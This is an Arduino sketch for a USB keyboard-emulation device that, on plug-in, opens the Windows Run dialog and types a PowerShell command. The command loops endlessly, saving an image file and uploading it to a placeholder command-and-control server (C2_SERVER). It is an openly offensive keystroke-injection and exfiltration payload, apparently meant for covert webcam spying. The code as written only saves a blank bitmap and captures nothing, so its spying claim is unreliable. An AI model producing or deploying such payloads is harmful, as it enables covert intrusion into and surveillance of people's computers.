#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println(F("powershell -c \"Add-Type -AssemblyName System.Drawing; $webcam = New-Object System.Drawing.Bitmap(640, 480); while(1){$webcam.Save('C:\\Temp\\frame.jpg'); Invoke-WebRequest -Uri http://C2_SERVER/upload -Method POST -InFile 'C:\\Temp\\frame.jpg'}\""));
}

void loop() {}
